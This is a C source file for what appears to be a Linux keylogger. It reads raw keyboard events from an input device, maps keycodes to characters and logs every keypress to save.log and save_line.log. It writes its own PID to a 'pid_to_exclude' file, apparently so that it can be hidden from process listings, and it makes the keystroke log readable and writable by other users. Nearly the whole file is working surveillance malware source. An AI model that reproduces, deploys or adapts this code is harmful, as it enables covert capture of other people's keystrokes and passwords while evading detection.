#include "keylogger.h"

t_keylogger *getKlg()
{
	static t_keylogger klg;
	return &klg;
}

void	clean_quit(t_keylogger *klg, int code)
{
	// TODO add program cleaning here (pid_to_exclude, klg.pid, etc...)
	close(klg->keyboardFD);
	close(klg->saveFD);
	close(klg->saveLineFD);
	close(klg->logFD);
	close(klg->dataFD);
	exit(code);
}

int		save_pid(t_keylogger *klg)
{
	pid_t	pid;
	int		fd;
	char	*pidstr;

	pid = getpid();
	if (((fd = open("/var/cache/pid_to_exclude", O_RDWR | O_CREAT | O_TRUNC, 0666)) > -1)
		&& (write(fd, &pid, sizeof(pid)) > -1))
		dprintf(klg->logFD, "write pid with success: %d\n", pid);
	else
	{
		dprintf(klg->logFD , "ERROR writing /var/cache/pid_to_exclude: %d\n", pid);
		return -1;
	}
	close(fd);
	pidstr = ft_itoa(pid);
	if (((fd = open("/run/klg.pid", O_RDWR | O_CREAT | O_TRUNC, 0666)) > -1)
		&& (write(fd, pidstr, ft_strlen(pidstr)) > -1))
		dprintf(klg->logFD, "write pid with success: %d\n", pid);
	else
	{
		dprintf(klg->logFD , "ERROR writing /run/klg.pid: %d\n", pid);
		return -1;
	}
	return 0;
}

void	selectKey(t_keylogger *klg)
{
	int mod;

	mod = 0;
	if (klg->mod.alt || klg->mod.mod)
		mod += 4;
	if (klg->mod.shift)
		mod += 1;
	dprintf(klg->saveFD, "Key: %i State: %i, desc: %s\n",klg->event.code, klg->event.value, klg->keymap[klg->event.code -1][mod]);
	dprintf(klg->saveLineFD, "%s",klg->keymap[klg->event.code -1][mod]);
	return ;
}
void	recording(t_keylogger *klg)
{
	while(read(klg->keyboardFD, &klg->event, sizeof(klg->event)) > 0)
	{
		if(klg->event.type == EV_KEY
			&& is_mod_key(klg) == FALSE
			&& klg->event.value == 1)
				selectKey(klg);
	}
	return ;
}
int		parseData(t_keylogger *klg)
{
	dprintf(klg->logFD, "Parse klg.data\n");
	if (get_next_line(klg->dataFD, &klg->event_location) == ERROR)
		return -1;
	if (get_next_line(klg->dataFD, &klg->rawMap) == ERROR)
		return -1;
	return 0;
}
int		openFiles(t_keylogger *klg)
{
	if((klg->logFD = open(LOGFILE, O_WRONLY | O_CREAT | O_APPEND, 0666)) <= 0)
		return -1;
	if((klg->dataFD = open(DATAPATH, O_RDONLY)) <= 0)
	{
		dprintf(klg->logFD, "Fail to open file:\tklg.data\n");
		return -1;
	}
	dprintf(klg->logFD, "open klg.data file with success\n");
	parseData(klg);
	if((klg->keyboardFD = open(klg->event_location, O_RDONLY)) <= 0)
	{
		dprintf(klg->logFD, "Fail to open file:\teventX-%s\n", klg->event_location);
		close(klg->logFD);
		return -1;
	}
	dprintf(klg->logFD, "open eventX file with success\n");
	if((klg->saveFD = open(LOGPATH "save.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
	{
		dprintf(klg->logFD, "open %ssave.log file failed\n", LOGPATH);
		return -1;
	}
	dprintf(klg->logFD, "open file save.log with success\n");
	if((klg->saveLineFD = open(LOGPATH "save_line.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
	{
		dprintf(klg->logFD, "open %ssave_line.log file failed\n", LOGPATH);
		return -1;
	}
	dprintf(klg->logFD, "open file %ssave_line.log with success\n", LOGPATH);
	return 0;
}
void	keylogger(void)
{
	t_keylogger         *klg;


	klg = getKlg();
	signal_handle(klg);
	if (save_pid(klg) != 0)
		return ;
	if (openFiles(klg) == -1)
		return ;
	chmod(LOGPATH "save.log", S_IROTH | S_IWOTH);
	if (setKeyMap(klg) == ERROR)
		clean_quit(klg, ERROR);
	dprintf(klg->logFD, "--Start recording\n");
	recording(klg);
	dprintf(klg->logFD, "Stop recording\n");
	clean_quit(klg, SUCCESS);
	return ;
}